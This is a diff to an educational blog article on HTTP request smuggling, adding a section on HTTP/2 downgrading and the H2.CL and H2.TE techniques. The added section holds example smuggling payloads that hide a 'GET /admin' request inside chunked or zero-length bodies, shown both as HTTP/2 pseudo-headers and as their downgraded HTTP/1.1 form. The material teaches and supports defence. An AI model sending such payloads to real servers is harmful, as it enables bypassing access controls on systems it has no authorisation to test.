@@ -1,5 +1,5 @@
 ---
-title: "Request Smuggling for HTTP/1.1 - Theory and Identification"
+title: "Understanding Request Smuggling"
 description: "HTTP request smuggling is a powerful attack that exploits inconsistencies in how front-end and back-end servers parse HTTP requests. This article provides a deep dive into the fundamentals, covering key HTTP headers like Content-Length and Transfer-Encoding, and explaining how parsing discrepancies create security risks. We explore how modern web architectures contribute to these vulnerabilities and demonstrate both manual and automated."
 showTableOfContents: true
 tags:
@@ -267,10 +267,89 @@ tRANSFER-ENCODING: chunked
 ```
 
 
-## 4. Conclusion & What's Next
+## 4. HTTP/2 Request Smuggling
 
-We've established a solid foundation for understanding HTTP request smuggling. We've examined essential HTTP headers, analyzed how discrepancies between front-end and back-end processing can introduce vulnerabilities, and explored both manual and automated methods for detecting these issues. A key aspect of this is understanding the role of Content-Length and Transfer-Encoding in request handling.
+HTTP/2, while maintaining the same methods, status codes, and headers as its predecessor, fundamentally changes how data is formatted and transmitted. Unlike the text-based HTTP/1, HTTP/2 is a binary protocol, sending data as a collection of 0s and 1s. In the context of request smuggling, it's crucial to note that HTTP/2 doesn't use Transfer-Encoding or Content-Length headers in the same way. Instead, each frame specifies its length in bytes at the beginning, as defined in the HTTP/2  **[frame format](https://datatracker.ietf.org/doc/html/rfc7540#section-4.1)**
 
-In the next article, we'll dive into HTTP/2 request smuggling—how it differs from HTTP/1.1, the nuances of length control, and how these differences can be leveraged for exploitation.
 
-Stay tuned for part two.
+
+### Http2 downgrading
+
+The vulnerability of HTTP/2 to request smuggling primarily stems from the process of HTTP/2 downgrading. Many organizations implement this downgrading for backward compatibility with legacy backend systems that haven't yet transitioned to HTTP/2. This flexibility allows administrators to maintain access to older systems while using modern frontend solutions.
+
+However, this backward compatibility introduces security risks. When downgrading occurs, the backend loses access to the HTTP/2 frame length value, potentially allowing the injection of HTTP/1 headers.
+
+
+
+### H2.CL and H2.TE
+
+In HTTP/2, requests use pseudo-headers instead of the traditional request line. For example, the path is represented by the :path pseudo-header, and the Host header is replaced by :authority. Here's an example of how an attacker might attempt to smuggle a request:
+
+
+```bash
+:method POST
+:path /test
+:authority example.com
+content-type application/x-www-form-urlencoded
+transfer-encoding chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com
+Foo: Injected
+```
+
+When downgraded to HTTP/1.1, this request might look like:
+
+
+```bash
+POST /test HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com
+Foo: Injected
+```
+
+In this scenario, the backend might interpret the body as a zero-length chunk, treating the rest as the beginning of a new request. This could potentially allow access to restricted paths like /admin.
+
+Similarly, an attacker could attempt to inject a Content-Length header:
+
+```bash
+:method POST
+:path /
+:authority example.com
+content-type application/x-www-form-urlencoded
+content-length 0
+
+GET /admin HTTP/1.1
+Host: example.com
+```
+
+When downgraded, this becomes:
+
+
+```bash
+POST / HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: example.com
+```
+
+Here, the body of the request might be ignored due to the Content-Length being set to zero, potentially allowing the smuggled request to be processed.
+
+There are many of possible injections points you can try, there is a great article about it by James Kettle: **[HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)**. In this article i want to just show basic mechanism.
+
+## Conclusion
+
+We’ve established a solid foundation for understanding HTTP request smuggling. We’ve examined essential HTTP headers, analyzed how discrepancies between front-end and back-end processing can introduce vulnerabilities, and explored both manual and automated methods for detecting these issues. A key aspect of this is understanding the role of Content-Length and Transfer-Encoding in request handling.
+
+Understanding HTTP/2 request smuggling requires knowledge of how HTTP/2 differs from HTTP/1, particularly in terms of data formatting and transmission. The vulnerability primarily arises from the downgrading process implemented for backward compatibility. By manipulating headers and taking advantage of how different servers interpret requests, attackers can potentially smuggle requests even in HTTP/2 environments.
